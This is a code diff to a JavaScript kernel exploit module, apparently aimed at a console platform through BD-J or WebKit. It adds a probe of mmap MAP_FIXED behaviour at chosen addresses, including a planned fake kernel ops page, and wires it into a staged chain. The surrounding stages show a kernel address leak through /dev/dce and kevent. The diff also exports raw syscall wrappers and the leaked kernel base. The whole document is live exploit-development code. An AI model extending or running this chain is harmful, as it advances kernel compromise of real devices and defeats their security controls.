@@ -1,4 +1,8 @@
 import { int64 } from "./int64.js";
+// v10: + ?probe=fixed — answers the open MAP_FIXED question (bytecode pc 6923-7041
+//     requires mmap(page,...,0x1012) to RETURN page in BD-J; WebKit untested).
+//     P1: anon -> munmap -> MAP_FIXED at same addr (fixed honored at known-free addr?)
+//     P2: MAP_FIXED at 0x00fa8000 (shape of real fakeops page for dce~250)
 import { HX1400_TABLES } from "./hx_tables.js";
 
 // ============================================================================
@@ -273,6 +277,25 @@ function marked(fd, rdb, lenp) {
          (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
 }
 
+// ---------- MAP_FIXED probe ----------
+function probeFixed() {
+  const m1 = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
+  const a1 = (BigInt(m1.hi >>> 0) << 32n) | BigInt(m1.lo >>> 0);
+  log("FIXED-P1-ANON", h16(a1));
+  if (a1 < 0x10000n) fin("probe: anon mmap failed rv=" + m1.i32);
+  const mu = scn("munmap", a1, 16384);
+  log("FIXED-P1-MUNMAP", "rc=" + mu);
+  const m2 = scn64("mmap", a1, 16384, 3, 0x1012, -1, 0);
+  const a2 = (BigInt(m2.hi >>> 0) << 32n) | BigInt(m2.lo >>> 0);
+  log("FIXED-P1-FIXED", "want=" + h16(a1) + " got=" + h16(a2) + (a2 === a1 ? " HONORED" : " IGNORED"));
+
+  const want = 0x00fa8000n;
+  const m3 = scn64("mmap", want, 16384, 3, 0x1012, -1, 0);
+  const a3 = (BigInt(m3.hi >>> 0) << 32n) | BigInt(m3.lo >>> 0);
+  log("FIXED-P2-LOW", "want=" + h16(want) + " got=" + h16(a3) + (a3 === want ? " HONORED" : " IGNORED"));
+  fin("fixed probe done");
+}
+
 // ---------- scan loop (v9: A/B close-grooming) ----------
 function phase2Leak(rootKq, fds, dceDev, tpl) {
   const rdb = allocBuf(512);
@@ -374,6 +397,8 @@ export async function runKevent(c) {
   log("NATIVES", Object.keys(NUM).map((k) => k + "=" + NUM[k] + "@0x" +
       num(ctx().stubAddr.get(NUM[k])).toString(16)).join(" "));
 
+  if (c.params && c.params.get && c.params.get("probe") === "fixed") probeFixed();
+
   const lowest = phaseR();
   const dceDev = mkDev("/dev/dce");
   phaseB1(dceDev);
@@ -393,3 +418,4 @@ export async function runKevent(c) {
   log("SLOT", "R_SLOT=" + h16(ka(P[13])) + " R_OPS=" + h16(ka(P[14])));
   fin("stage2 DONE (kva held). Next: one-time EV_ADD -23 + fakeops build (bytecode pc 6760-9200)");
 }
+export function hxBridge() { return { scn, scn64, allocBuf, zeroBuf, log, fin, ka, h16, P: T.P, getKbase: () => STATE.kbase }; }
